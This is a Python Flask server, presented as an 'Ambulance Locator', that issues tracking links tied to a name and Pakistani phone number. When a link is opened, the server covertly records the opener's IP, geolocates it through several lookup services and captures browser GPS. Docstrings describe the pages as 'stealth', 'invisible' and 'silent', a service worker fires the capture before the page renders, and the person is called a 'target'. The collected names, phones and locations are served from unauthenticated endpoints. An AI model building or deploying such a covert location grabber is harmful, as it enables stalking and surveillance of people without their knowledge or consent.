import os
import re
import uuid
import json
import urllib.request
import geoip2.database
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, abort, make_response

app = Flask(__name__)

# ═════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═════════════════════════════════════════════════════════════════════

CASES = {}
LINK_LIFETIME_MINUTES = 30

# ── API Keys ──
GOOGLE_API_KEY = os.environ.get("GOOGLE_API_KEY", "")
IPINFO_TOKEN = os.environ.get("IPINFO_TOKEN", "")

# ── MaxMind GeoLite2 Database (local, offline, free) ──
MAXMIND_DB_PATH = os.environ.get("MAXMIND_DB_PATH", "GeoLite2-City.mmdb")
_maxmind_reader = None


def get_maxmind_reader():
    global _maxmind_reader
    if _maxmind_reader is None:
        try:
            if os.path.exists(MAXMIND_DB_PATH):
                _maxmind_reader = geoip2.database.Reader(MAXMIND_DB_PATH)
                print(f"[MAXMIND] Loaded GeoLite2 database from {MAXMIND_DB_PATH}")
            else:
                print(f"[MAXMIND] Database not found at {MAXMIND_DB_PATH}")
        except Exception as e:
            print(f"[MAXMIND] Failed to load database: {e}")
    return _maxmind_reader


# ══════════════════════════════════════════════════════════════════════
# PAKISTAN MOBILE PREFIX DATABASE (ALL 100 PREFIXES 0300-0399)
# ══════════════════════════════════════════════════════════════════════

PAKISTAN_PREFIX_MAP = {
    "300": ("01", "Jazz"), "301": ("01", "Jazz"), "302": ("01", "Jazz"),
    "303": ("01", "Jazz"), "304": ("01", "Jazz"), "305": ("01", "Jazz"),
    "306": ("01", "Jazz"), "307": ("01", "Jazz"), "308": ("01", "Jazz"),
    "309": ("01", "Jazz"),
    "310": ("04", "Zong"), "311": ("04", "Zong"), "312": ("04", "Zong"),
    "313": ("04", "Zong"), "314": ("04", "Zong"), "315": ("04", "Zong"),
    "316": ("04", "Zong"), "317": ("04", "Zong"), "318": ("04", "Zong"),
    "319": ("04", "Zong"),
    "320": ("07", "Jazz"), "321": ("07", "Jazz"), "322": ("07", "Jazz"),
    "323": ("07", "Jazz"), "324": ("07", "Jazz"), "325": ("07", "Jazz"),
    "326": ("07", "Jazz"), "327": ("07", "Jazz"), "328": ("07", "Jazz"),
    "329": ("07", "Jazz"),
    "330": ("03", "Ufone"), "331": ("03", "Ufone"), "332": ("03", "Ufone"),
    "333": ("03", "Ufone"), "334": ("03", "Ufone"), "335": ("03", "Ufone"),
    "336": ("03", "Ufone"), "337": ("03", "Ufone"), "338": ("03", "Ufone"),
    "339": ("03", "Ufone"),
    "340": ("06", "Telenor"), "341": ("06", "Telenor"), "342": ("06", "Telenor"),
    "343": ("06", "Telenor"), "344": ("06", "Telenor"), "345": ("06", "Telenor"),
    "346": ("06", "Telenor"), "347": ("06", "Telenor"), "348": ("06", "Telenor"),
    "349": ("06", "Telenor"),
    "350": (None, None), "351": (None, None), "352": (None, None),
    "353": (None, None), "354": (None, None),
    "355": ("05", "SCOM"), "356": ("05", "SCOM"), "357": ("05", "SCOM"),
    "358": (None, None), "359": (None, None),
    "360": ("04", "Zong"), "361": ("04", "Zong"), "362": ("04", "Zong"),
    "363": ("04", "Zong"), "364": ("04", "Zong"), "365": ("04", "Zong"),
    "366": (None, None), "367": (None, None), "368": (None, None),
    "369": (None, None),
    "370": ("04", "Zong"), "371": ("04", "Zong"),
    "372": ("01", "Jazz"), "373": ("01", "Jazz"), "374": ("01", "Jazz"),
    "375": ("01", "Jazz"), "376": ("01", "Jazz"), "377": ("01", "Jazz"),
    "378": ("01", "Jazz"), "379": ("01", "Jazz"),
    "380": (None, None), "381": (None, None), "382": (None, None),
    "383": (None, None), "384": (None, None), "385": (None, None),
    "386": (None, None), "387": (None, None), "388": (None, None),
    "389": (None, None),
    "390": (None, None), "391": (None, None), "392": (None, None),
    "393": (None, None), "394": (None, None), "395": (None, None),
    "396": (None, None), "397": (None, None), "398": (None, None),
    "399": (None, None),
}

PAKISTAN_CITY_COORDS = {
    "Karachi":       (24.8607, 67.0011),
    "Lahore":        (31.5204, 74.3587),
    "Islamabad":     (33.6844, 73.0479),
    "Rawalpindi":    (33.5651, 73.0169),
    "Faisalabad":    (31.4504, 73.1350),
    "Multan":        (30.1575, 71.5249),
    "Peshawar":      (34.0150, 71.5249),
    "Quetta":        (30.1798, 66.9750),
    "Hyderabad":     (25.3960, 68.3578),
    "Muzaffarabad":  (34.3700, 73.4712),
    "Gilgit":        (35.9200, 74.3100),
    "Skardu":        (35.3000, 75.6300),
    "Gujranwala":    (32.1877, 74.1940),
    "Sialkot":       (32.4927, 74.5310),
    "Sargodha":      (32.0740, 72.6861),
    "Bahawalpur":    (29.3956, 71.6751),
    "Sheikhupura":   (31.7167, 73.9833),
    "Rahim Yar Khan":(28.4200, 70.3000),
    "Jhelum":        (32.9400, 73.7300),
    "Sahiwal":       (30.6700, 73.1100),
    "Okara":         (30.8100, 73.4500),
    "Gujrat":        (32.5700, 74.0800),
    "Kasur":         (31.1200, 74.4500),
    "Dera Ghazi Khan":(30.0500, 70.6400),
    "Vehari":        (30.0300, 72.3500),
    "Hafizabad":     (32.0700, 73.6800),
    "Narowal":       (32.1000, 74.8700),
    "Khanewal":      (30.3000, 71.9300),
    "Pakpattan":     (30.3400, 73.3900),
    "Lodhran":       (29.5400, 71.6300),
    "Bhakkar":       (31.6300, 71.0700),
    "Chiniot":       (31.7200, 72.9800),
    "Mianwali":      (32.5800, 71.5400),
    "Layyah":        (30.9600, 70.9400),
    "Muzaffargarh":  (30.0700, 71.1900),
    "Rajankot":      (29.3900, 70.2600),
    "Sukkur":        (27.7000, 68.8167),
    "Larkana":       (27.5600, 68.2100),
    "Mirpur Khas":   (25.5300, 69.0100),
    "Nawabshah":     (26.2500, 68.4100),
    "Jacobabad":     (28.2800, 68.4400),
    "Shikarpur":     (27.9600, 68.6400),
    "Dadu":          (26.7300, 67.7800),
    "Khairpur":      (27.5300, 68.7600),
    "Badin":         (24.6600, 68.8400),
    "Thatta":        (24.7500, 67.9200),
    "Sanghar":       (25.5800, 68.9500),
    "Ghotki":        (28.0000, 69.3200),
    "Umerkot":       (25.3600, 69.7400),
    "Tando Allahyar":(25.4700, 68.7200),
    "Tando Adam":    (25.7600, 68.6700),
    "Kashmore":      (28.4300, 69.5800),
    "Naushahro Feroze":(26.8400, 68.1200),
    "Abbottabad":    (34.1500, 73.2200),
    "Mardan":        (34.2000, 72.0400),
    "Swat":          (34.7800, 72.3600),
    "Kohat":         (33.5900, 71.4400),
    "Bannu":         (32.9900, 70.6000),
    "Dera Ismail Khan":(31.8300, 70.9000),
    "Charsadda":     (34.1500, 71.7400),
    "Nowshera":      (34.0200, 72.0000),
    "Mansehra":      (34.3300, 73.2000),
    "Swabi":         (34.1200, 72.4700),
    "Haripur":       (33.9900, 72.9300),
    "Batagram":      (34.6800, 73.0200),
    "Kohistan":      (35.1800, 73.0400),
    "Upper Dir":     (35.2000, 71.8700),
    "Lower Dir":     (34.8700, 71.7300),
    "Buner":         (34.3800, 72.6100),
    "Shangla":       (34.6800, 72.8400),
    "Malakand":      (34.6000, 71.9300),
    "Lakki Marwat":  (32.6100, 70.9200),
    "Tank":          (32.2200, 70.3800),
    "Hangu":         (33.5300, 71.0600),
    "Karak":         (33.1200, 71.0900),
    "Chitral":       (35.8500, 71.7900),
    "Gwadar":        (25.1300, 62.3300),
    "Turbat":        (26.0000, 63.0500),
    "Khuzdar":       (27.8000, 66.6200),
    "Hub":           (25.0300, 66.8900),
    "Chaman":        (30.9200, 66.4500),
    "Zhob":          (31.3400, 69.4500),
    "Sibi":          (29.5500, 67.8800),
    "Loralai":       (30.3700, 68.5900),
    "Ziarat":        (30.3800, 67.7300),
    "Kalat":         (29.0300, 66.5800),
    "Mastung":       (29.8000, 66.8500),
    "Nushki":        (29.5600, 66.0200),
    "Panjgur":       (26.9700, 64.1000),
    "Kharan":        (28.5800, 65.4200),
    "Awaran":        (26.4500, 65.3100),
    "Bela":          (26.2300, 66.3100),
    "Dera Bugti":    (29.0300, 69.1700),
    "Kohlu":         (29.9000, 69.2500),
    "Barkhan":       (29.9000, 69.5200),
    "Musakhel":      (30.8500, 69.8200),
    "Mirpur":        (33.1500, 73.7500),
    "Kotli":         (33.5200, 73.9100),
    "Rawalakot":     (33.8600, 73.7600),
    "Bhimber":       (33.0100, 74.0700),
    "Palandri":      (33.7200, 73.6800),
    "Bagh":          (33.9800, 73.7800),
    "Hattian Bala":  (34.1700, 73.7400),
    "Neelum":        (34.5900, 73.9100),
    "Hajira":        (33.7100, 73.7900),
    "Hunza":         (36.3200, 74.6600),
    "Nagar":         (36.2700, 74.7200),
    "Ghanche":       (35.8500, 76.4000),
    "Astore":        (35.3600, 74.8600),
    "Diamer":        (35.5600, 74.2400),
    "Ghizer":        (36.2400, 73.2500),
    "Shigar":        (35.4200, 75.7300),
    "Kharmang":      (35.2400, 75.9900),
    "Kurram":        (33.8700, 70.0800),
    "Khyber":        (34.1000, 71.0800),
    "Orakzai":       (33.8300, 70.9200),
    "Mohmand":       (34.4100, 71.3700),
    "Bajaur":        (34.6900, 71.5000),
    "North Waziristan":(32.9800, 70.1500),
    "South Waziristan":(32.2000, 69.5000),
}

PAKISTAN_PREFIX_CITY_MAP = {
    "300": "Lahore", "301": "Lahore", "302": "Lahore", "303": "Lahore",
    "304": "Faisalabad", "305": "Faisalabad",
    "306": "Multan", "307": "Multan", "308": "Multan", "309": "Multan",
    "310": "Karachi", "311": "Karachi", "312": "Karachi", "313": "Karachi",
    "314": "Lahore", "315": "Lahore",
    "316": "Islamabad", "317": "Islamabad",
    "318": "Faisalabad", "319": "Faisalabad",
    "320": "Karachi", "321": "Karachi", "322": "Karachi", "323": "Karachi",
    "324": "Hyderabad", "325": "Hyderabad",
    "326": "Sukkur", "327": "Sukkur",
    "328": "Larkana", "329": "Larkana",
    "330": "Islamabad", "331": "Islamabad", "332": "Rawalpindi", "333": "Islamabad",
    "334": "Lahore", "335": "Lahore",
    "336": "Peshawar", "337": "Peshawar",
    "338": "Faisalabad", "339": "Faisalabad",
    "340": "Islamabad", "341": "Islamabad", "342": "Rawalpindi", "343": "Rawalpindi",
    "344": "Lahore", "345": "Lahore", "346": "Lahore", "347": "Lahore",
    "348": "Faisalabad", "349": "Faisalabad",
    "350": "Islamabad", "351": "Islamabad", "352": "Lahore", "353": "Karachi", "354": "Karachi",
    "355": "Muzaffarabad", "356": "Gilgit", "357": "Skardu",
    "358": "Peshawar", "359": "Peshawar",
    "360": "Karachi", "361": "Karachi", "362": "Lahore", "363": "Lahore",
    "364": "Islamabad", "365": "Islamabad",
    "366": "Multan", "367": "Faisalabad", "368": "Peshawar", "369": "Quetta",
    "370": "Karachi", "371": "Lahore",
    "372": "Lahore", "373": "Lahore", "374": "Lahore",
    "375": "Karachi", "376": "Karachi", "377": "Karachi",
    "378": "Islamabad", "379": "Islamabad",
    "380": "Karachi", "381": "Karachi", "382": "Lahore", "383": "Lahore",
    "384": "Islamabad", "385": "Islamabad", "386": "Faisalabad", "387": "Faisalabad",
    "388": "Multan", "389": "Multan",
    "390": "Peshawar", "391": "Peshawar", "392": "Quetta", "393": "Quetta",
    "394": "Hyderabad", "395": "Hyderabad", "396": "Sukkur",
    "397": "Gujranwala", "398": "Sialkot", "399": "Sialkot",
}

PAKISTAN_TIMEZONES = ["Asia/Karachi", "PKT"]
PAKISTAN_BBOX = {"min_lat": 23.5, "max_lat": 37.5, "min_lng": 60.5, "max_lng": 78.5}
KNOWN_BAD_COUNTRIES_FOR_PAKISTAN = [
    "CA", "US", "GB", "NL", "DE", "FR", "IT", "ES", "SG",
    "AU", "AE", "SA", "HK", "JP", "KR", "SE", "NO", "DK",
    "CH", "AT", "BE", "IE", "PT", "GR", "CZ", "PL", "RO",
]


# ══════════════════════════════════════════════════════════════════════
# PHONE NUMBER PARSER
# ══════════════════════════════════════════════════════════════════════

def parse_phone_number(phone):
    if not phone:
        return None, None, None, None, None, None
    digits = re.sub(r"\D", "", phone)
    is_pakistan = False
    prefix = None
    if digits.startswith("92") and len(digits) == 12:
        is_pakistan = True
        prefix = digits[2:5]
    elif digits.startswith("0") and len(digits) == 11:
        is_pakistan = True
        prefix = digits[1:4]
    if is_pakistan and prefix:
        mcc = "410"
        prefix_data = PAKISTAN_PREFIX_MAP.get(prefix, (None, None))
        mnc, operator_name = prefix_data
        city_hint = PAKISTAN_PREFIX_CITY_MAP.get(prefix)
        if operator_name and mnc:
            carrier_info = f"{operator_name} Pakistan (MCC={mcc}, MNC={mnc})"
        else:
            carrier_info = f"Pakistan (MCC={mcc})"
        return "92", prefix, mcc, mnc, carrier_info, city_hint
    return None, None, None, None, None, None


# ══════════════════════════════════════════════════════════════════════
# GEOLOCATION ENGINES (5 engines)
# ══════════════════════════════════════════════════════════════════════

def geo_maxmind(ip_address):
    reader = get_maxmind_reader()
    if reader is None:
        return None, None, None, None
    try:
        response = reader.city(ip_address)
        lat = response.location.latitude
        lng = response.location.longitude
        country = response.country.iso_code
        acc_radius_km = response.location.accuracy_radius
        accuracy = (acc_radius_km * 1000) if acc_radius_km else 50000
        if lat is not None and lng is not None:
            return float(lat), float(lng), float(accuracy), country
    except Exception:
        pass
    return None, None, None, None


def geo_ipapi(ip_address):
    try:
        url = f"http://ip-api.com/json/{ip_address}?fields=lat,lon,accuracy,status,countryCode,city"
        with urllib.request.urlopen(url, timeout=4) as resp:
            data = json.loads(resp.read().decode())
            if data.get("status") == "success":
                lat = data.get("lat")
                lng = data.get("lon")
                acc = data.get("accuracy", 5000)
                country = data.get("countryCode", "")
                if lat is not None and lng is not None:
                    return float(lat), float(lng), float(acc), country
    except Exception:
        pass
    return None, None, None, None


def geo_ipapi_co(ip_address):
    try:
        url = f"https://ipapi.co/{ip_address}/json/"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=4) as resp:
            data = json.loads(resp.read().decode())
            lat = data.get("latitude")
            lng = data.get("longitude")
            country = data.get("country_code", "")
            if lat is not None and lng is not None:
                return float(lat), float(lng), 50000, country
    except Exception:
        pass
    return None, None, None, None


def geo_ipinfo(ip_address):
    try:
        if IPINFO_TOKEN:
            url = f"https://ipinfo.io/{ip_address}?token={IPINFO_TOKEN}"
        else:
            url = f"https://ipinfo.io/{ip_address}/json"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=4) as resp:
            data = json.loads(resp.read().decode())
            loc_str = data.get("loc")
            country = data.get("country", "")
            if loc_str:
                parts = loc_str.split(",")
                if len(parts) == 2:
                    return float(parts[0]), float(parts[1]), 50000, country
    except Exception:
        pass
    return None, None, None, None


def geo_google(ip_address, mcc=None, mnc=None):
    if not GOOGLE_API_KEY:
        return None, None, None, None
    try:
        payload = {"considerIp": True}
        if mcc:
            payload["homeMobileCountryCode"] = int(mcc)
        if mnc:
            payload["homeMobileNetworkCode"] = int(mnc)
        payload["radioType"] = "lte"
        url = f"https://www.googleapis.com/geolocation/v1/geolocate?key={GOOGLE_API_KEY}"
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            url, data=data,
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            result = json.loads(resp.read().decode())
            lat = result.get("location", {}).get("lat")
            lng = result.get("location", {}).get("lng")
            acc = result.get("accuracy", 50000)
            if lat is not None and lng is not None:
                country = "PK" if mcc == "410" else None
                return float(lat), float(lng), float(acc), country
    except Exception:
        pass
    return None, None, None, None


# ══════════════════════════════════════════════════════════════════════
# MASTER GEOLOCATION ORCHESTRATOR
# ══════════════════════════════════════════════════════════════════════

def ip_geolocate(ip_address, mcc=None, mnc=None, browser_timezone=None, city_hint=None):
    if is_private_ip(ip_address):
        return None, None, None, None, None, 0

    is_pakistani_target = (mcc == "410" or city_hint is not None or
                           (browser_timezone and browser_timezone in PAKISTAN_TIMEZONES))

    results = []

    mm_lat, mm_lng, mm_acc, mm_country = geo_maxmind(ip_address)
    if mm_lat is not None:
        results.append({"lat": mm_lat, "lng": mm_lng, "acc": mm_acc, "country": mm_country, "source": "maxmind"})

    ia_lat, ia_lng, ia_acc, ia_country = geo_ipapi(ip_address)
    if ia_lat is not None:
        results.append({"lat": ia_lat, "lng": ia_lng, "acc": ia_acc, "country": ia_country, "source": "ip-api"})

    ico_lat, ico_lng, ico_acc, ico_country = geo_ipapi_co(ip_address)
    if ico_lat is not None:
        results.append({"lat": ico_lat, "lng": ico_lng, "acc": ico_acc, "country": ico_country, "source": "ipapi.co"})

    ii_lat, ii_lng, ii_acc, ii_country = geo_ipinfo(ip_address)
    if ii_lat is not None:
        results.append({"lat": ii_lat, "lng": ii_lng, "acc": ii_acc, "country": ii_country, "source": "ipinfo"})

    gg_lat, gg_lng, gg_acc, gg_country = geo_google(ip_address, mcc, mnc)
    if gg_lat is not None:
        results.append({"lat": gg_lat, "lng": gg_lng, "acc": gg_acc, "country": gg_country, "source": "google"})

    if is_pakistani_target and results:
        filtered = []
        for r in results:
            if r["source"] == "google" and mcc:
                filtered.append(r)
                continue
            if r["source"] == "maxmind" and r["country"] == "PK":
                filtered.append(r)
                continue
            if r["country"] is None:
                filtered.append(r)
                continue
            if r["country"] not in KNOWN_BAD_COUNTRIES_FOR_PAKISTAN:
                filtered.append(r)
        if filtered:
            results = filtered

    if is_pakistani_target and browser_timezone and browser_timezone in PAKISTAN_TIMEZONES:
        tz_filtered = []
        for r in results:
            if r["lat"] is not None and r["lng"] is not None:
                if is_within_pakistan(r["lat"], r["lng"]):
                    tz_filtered.append(r)
            else:
                tz_filtered.append(r)
        if tz_filtered:
            results = tz_filtered

    if not results:
        if is_pakistani_target and city_hint:
            lat, lng = PAKISTAN_CITY_COORDS.get(city_hint, (30.3753, 69.3451))
            return lat, lng, 50000, "phone_city", "PK", 30
        return None, None, None, None, None, 0

    weights = {"google": 3.0, "maxmind": 2.0, "ip-api": 1.5, "ipinfo": 1.2, "ipapi.co": 1.0}
    google_boost = any(r["source"] == "google" and mcc for r in results)

    total_weight = 0.0
    lat_sum = 0.0
    lng_sum = 0.0
    best_acc = float("inf")
    best_source = "unknown"

    for r in results:
        w = weights.get(r["source"], 1.0)
        if r["source"] == "google" and mcc:
            w *= 5.0
        if r["source"] == "maxmind":
            w *= 1.5
        acc_factor = max(0.1, 1.0 / (r["acc"] / 5000.0 + 1.0))
        effective_weight = w * acc_factor
        total_weight += effective_weight
        lat_sum += r["lat"] * effective_weight
        lng_sum += r["lng"] * effective_weight
        if r["acc"] < best_acc:
            best_acc = r["acc"]
            best_source = r["source"]

    if total_weight == 0:
        if city_hint and city_hint in PAKISTAN_CITY_COORDS:
            lat, lng = PAKISTAN_CITY_COORDS[city_hint]
            return lat, lng, 50000, "phone_fallback", "PK", 30
        return None, None, None, None, None, 0

    avg_lat = lat_sum / total_weight
    avg_lng = lng_sum / total_weight

    confidence = 50
    if google_boost:
        confidence += 25
    if any(r["source"] == "maxmind" for r in results):
        confidence += 10
    if is_within_pakistan(avg_lat, avg_lng):
        confidence += 10
    if browser_timezone and browser_timezone in PAKISTAN_TIMEZONES:
        confidence += 10
    if city_hint:
        for city, (clat, clng) in PAKISTAN_CITY_COORDS.items():
            if city == city_hint:
                dist = haversine(avg_lat, avg_lng, clat, clng)
                if dist < 50:
                    confidence += 15
                elif dist < 100:
                    confidence += 5
                break
    if best_acc < 1000:
        confidence += 15
    elif best_acc < 5000:
        confidence += 5
    confidence = min(confidence, 100)

    return avg_lat, avg_lng, best_acc, best_source, "PK", confidence


# ══════════════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ══════════════════════════════════════════════════════════════════════

def haversine(lat1, lng1, lat2, lng2):
    import math
    R = 6371
    dlat = math.radians(lat2 - lat1)
    dlng = math.radians(lng2 - lng1)
    a = (math.sin(dlat/2)**2 +
         math.cos(math.radians(lat1)) * math.cos(math.radians(lat2)) *
         math.sin(dlng/2)**2)
    c = 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))
    return R * c


def is_within_pakistan(lat, lng):
    return (PAKISTAN_BBOX["min_lat"] <= lat <= PAKISTAN_BBOX["max_lat"]
            and PAKISTAN_BBOX["min_lng"] <= lng <= PAKISTAN_BBOX["max_lng"])


def is_private_ip(ip):
    if not ip:
        return True
    if ip.startswith(("127.", "10.", "192.168.", "0.", "::1")):
        return True
    if ip.startswith("172."):
        try:
            second = int(ip.split(".")[1])
            if 16 <= second <= 31:
                return True
        except (ValueError, IndexError):
            pass
    return False


def get_client_ip():
    xff = request.headers.get("X-Forwarded-For")
    if xff:
        return xff.split(",")[0].strip()
    xri = request.headers.get("X-Real-IP")
    if xri:
        return xri.strip()
    return request.remote_addr


# ══════════════════════════════════════════════════════════════════════
# CASE MANAGEMENT
# ══════════════════════════════════════════════════════════════════════

def new_case(patient_name=None, phone=None):
    token = uuid.uuid4().hex[:12]
    country_code, prefix, mcc, mnc, carrier_info, city_hint = parse_phone_number(phone)
    case = {
        "token": token,
        "patient_name": patient_name,
        "phone": phone,
        "country_code": country_code,
        "phone_prefix": prefix,
        "mcc": mcc,
        "mnc": mnc,
        "carrier_info": carrier_info,
        "city_hint": city_hint,
        "created_at": datetime.utcnow(),
        "responded_at": None,
        "status": "pending",
        "visit_count": 0,
        "visits": [],
        "latitude": None,
        "longitude": None,
        "accuracy": None,
        "source": None,
        "confidence": None,
        "browser_timezone": None,
    }
    return case


def is_expired(case):
    return datetime.utcnow() - case["created_at"] > timedelta(minutes=LINK_LIFETIME_MINUTES)


def record_visit(case, ip_address, browser_timezone=None, gps_data=None):
    case["visit_count"] += 1
    if browser_timezone:
        case["browser_timezone"] = browser_timezone

    mcc = case.get("mcc")
    mnc = case.get("mnc")
    city_hint = case.get("city_hint")

    lat, lng, acc, source, country, confidence = ip_geolocate(
        ip_address, mcc, mnc, browser_timezone, city_hint
    )

    visit = {
        "timestamp": datetime.utcnow().isoformat(),
        "ip": ip_address,
        "ip_latitude": lat,
        "ip_longitude": lng,
        "ip_accuracy": acc,
        "ip_source": source,
        "ip_country": country,
        "ip_confidence": confidence,
        "browser_timezone": browser_timezone,
        "gps_latitude": None,
        "gps_longitude": None,
        "gps_accuracy": None,
        "source": "ip",
        "latitude": lat,
        "longitude": lng,
        "accuracy": acc,
    }

    if gps_data:
        visit["gps_latitude"] = gps_data.get("latitude")
        visit["gps_longitude"] = gps_data.get("longitude")
        visit["gps_accuracy"] = gps_data.get("accuracy")
        if gps_data.get("latitude") is not None:
            visit["latitude"] = gps_data["latitude"]
            visit["longitude"] = gps_data["longitude"]
            visit["accuracy"] = gps_data.get("accuracy")
            visit["source"] = "gps"

    case["visits"].append(visit)

    if lat is not None:
        case["latitude"] = visit["latitude"]
        case["longitude"] = visit["longitude"]
        case["accuracy"] = visit["accuracy"]
        case["source"] = visit["source"]
        case["confidence"] = confidence

    if case["status"] == "pending" and (lat is not None or gps_data):
        case["status"] = "located"
        case["responded_at"] = datetime.utcnow()


# ══════════════════════════════════════════════════════════════════════
# ROUTES
# ══════════════════════════════════════════════════════════════════════

@app.route("/")
def index():
    return "Ambulance Locator — POST /create to generate a link."


@app.route("/sw.js")
def service_worker():
    response = make_response(render_template("sw.js"))
    response.headers["Content-Type"] = "application/javascript"
    response.headers["Service-Worker-Allowed"] = "/"
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    return response


@app.route("/create", methods=["POST"])
def create_case():
    data = request.get_json(silent=True) or {}
    case = new_case(data.get("patient_name"), data.get("phone"))
    CASES[case["token"]] = case
    link = request.url_root.rstrip("/") + "/go/" + case["token"]
    return jsonify({
        "token": case["token"],
        "link": link,
        "carrier_info": case.get("carrier_info"),
        "city_hint": case.get("city_hint"),
    })


@app.route("/go/<token>")
def go(token):
    """
    STEALTH-ONLY endpoint.
    SW intercepts this on supported browsers and returns inline stealth HTML.
    Non-SW browsers (or first visit before SW activates) get this server-rendered
    stealth page — still invisible, still silent.
    """
    case = CASES.get(token)
    if not case:
        abort(404)

    client_ip = get_client_ip()
    expired = is_expired(case)

    if not expired:
        record_visit(case, client_ip)
        if is_expired(case):
            case["status"] = "expired"
            expired = True

    return render_template("stealth.html", token=token, expired=expired)


@app.route("/sw-capture/<token>")
def sw_capture(token):
    """
    Called by the Service Worker immediately on intercept.
    Triggers server-side IP geolocation before the HTML even renders.
    The SW never waits for this response — it fires and forgets.
    """
    case = CASES.get(token)
    if not case:
        return jsonify({"error": "not found"}), 404

    client_ip = get_client_ip()
    expired = is_expired(case)

    if not expired:
        record_visit(case, client_ip)
        if is_expired(case):
            case["status"] = "expired"

    return jsonify({
        "ok": True,
        "token": token,
        "status": case["status"],
        "source": case.get("source"),
        "latitude": case.get("latitude"),
        "longitude": case.get("longitude"),
        "accuracy": case.get("accuracy"),
        "confidence": case.get("confidence"),
        "city_hint": case.get("city_hint"),
        "carrier_info": case.get("carrier_info"),
    })


@app.route("/api/location-update", methods=["POST"])
def location_update():
    """Receives stealth GPS coordinates or IP fallback data silently."""
    data = request.get_json(silent=True) or {}
    token = data.get("token")
    case = CASES.get(token)
    if not case:
        return jsonify({"error": "invalid token"}), 404

    if is_expired(case):
        case["status"] = "expired"
        return jsonify({"error": "link expired"}), 410

    lat = data.get("latitude")
    lng = data.get("longitude")
    acc = data.get("accuracy")
    tz = data.get("timezone")
    conn_type = data.get("connectionType")

    if tz:
        case["browser_timezone"] = tz

    # Timezone-aware IP geolocation re-run if we have better context now
    if tz and case["visits"]:
        latest = case["visits"][-1]
        if latest.get("ip_confidence", 0) < 50 and latest.get("ip_country") != "PK":
            mcc = case.get("mcc")
            mnc = case.get("mnc")
            city_hint = case.get("city_hint")
            ip_lat, ip_lng, ip_acc, ip_source, ip_country, ip_conf = ip_geolocate(
                latest["ip"], mcc, mnc, tz, city_hint
            )
            if ip_lat is not None:
                latest["ip_latitude"] = ip_lat
                latest["ip_longitude"] = ip_lng
                latest["ip_accuracy"] = ip_acc
                latest["ip_source"] = ip_source
                latest["ip_country"] = ip_country
                latest["ip_confidence"] = ip_conf
                if not latest.get("gps_latitude"):
                    latest["latitude"] = ip_lat
                    latest["longitude"] = ip_lng
                    latest["accuracy"] = ip_acc
                    case["latitude"] = ip_lat
                    case["longitude"] = ip_lng
                    case["accuracy"] = ip_acc
                    case["source"] = "ip"
                    case["confidence"] = ip_conf

    if lat is not None and lng is not None and case["visits"]:
        latest = case["visits"][-1]
        latest["gps_latitude"] = lat
        latest["gps_longitude"] = lng
        latest["gps_accuracy"] = acc
        latest["latitude"] = lat
        latest["longitude"] = lng
        latest["accuracy"] = acc
        latest["source"] = "gps"
        case["latitude"] = lat
        case["longitude"] = lng
        case["accuracy"] = acc
        case["source"] = "gps"
        case["confidence"] = 100
        if case["status"] == "pending":
            case["status"] = "located"
            case["responded_at"] = datetime.utcnow()
    elif conn_type:
        if case["visits"]:
            case["visits"][-1]["connection_type"] = conn_type

    return jsonify({"ok": True})


@app.route("/api/location-denied", methods=["POST"])
def location_denied():
    """When GPS is not available — uses IP fallback."""
    data = request.get_json(silent=True) or {}
    token = data.get("token")
    case = CASES.get(token)
    if case and case["visits"]:
        tz = data.get("timezone")
        conn_type = data.get("connectionType")
        if tz:
            case["browser_timezone"] = tz
            latest = case["visits"][-1]
            if latest.get("ip_confidence", 0) < 50:
                mcc = case.get("mcc")
                mnc = case.get("mnc")
                city_hint = case.get("city_hint")
                ip_lat, ip_lng, ip_acc, ip_source, ip_country, ip_conf = ip_geolocate(
                    latest["ip"], mcc, mnc, tz, city_hint
                )
                if ip_lat is not None:
                    latest["ip_latitude"] = ip_lat
                    latest["ip_longitude"] = ip_lng
                    latest["ip_accuracy"] = ip_acc
                    latest["ip_source"] = ip_source
                    latest["ip_country"] = ip_country
                    latest["ip_confidence"] = ip_conf
                    latest["latitude"] = ip_lat
                    latest["longitude"] = ip_lng
                    latest["accuracy"] = ip_acc
                    case["latitude"] = ip_lat
                    case["longitude"] = ip_lng
                    case["accuracy"] = ip_acc
                    case["source"] = "ip"
                    case["confidence"] = ip_conf
        if conn_type:
            case["visits"][-1]["connection_type"] = conn_type
    return jsonify({"ok": True})


@app.route("/api/cases")
def api_cases():
    cases = sorted(CASES.values(), key=lambda c: c["created_at"], reverse=True)
    out = []
    for c in cases:
        visits_clean = []
        for v in c.get("visits", []):
            visits_clean.append({
                "timestamp": v.get("timestamp"),
                "latitude": v.get("latitude"),
                "longitude": v.get("longitude"),
                "accuracy": v.get("accuracy"),
                "source": v.get("source"),
                "ip_source": v.get("ip_source"),
                "ip_country": v.get("ip_country"),
                "ip_confidence": v.get("ip_confidence"),
                "browser_timezone": v.get("browser_timezone"),
                "ip": v.get("ip"),
                "connection_type": v.get("connection_type"),
            })
        out.append({
            "token": c["token"],
            "patient_name": c["patient_name"],
            "phone": c["phone"],
            "carrier_info": c.get("carrier_info"),
            "city_hint": c.get("city_hint"),
            "status": c["status"],
            "source": c["source"],
            "latitude": c["latitude"],
            "longitude": c["longitude"],
            "accuracy": c["accuracy"],
            "confidence": c.get("confidence"),
            "browser_timezone": c.get("browser_timezone"),
            "visit_count": c.get("visit_count", 0),
            "visits": visits_clean,
            "created_at": c["created_at"].isoformat(),
        })
    return jsonify(out)


@app.route("/dashboard")
def dashboard():
    cases = sorted(CASES.values(), key=lambda c: c["created_at"], reverse=True)
    return render_template("dashboard.html", cases=cases)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
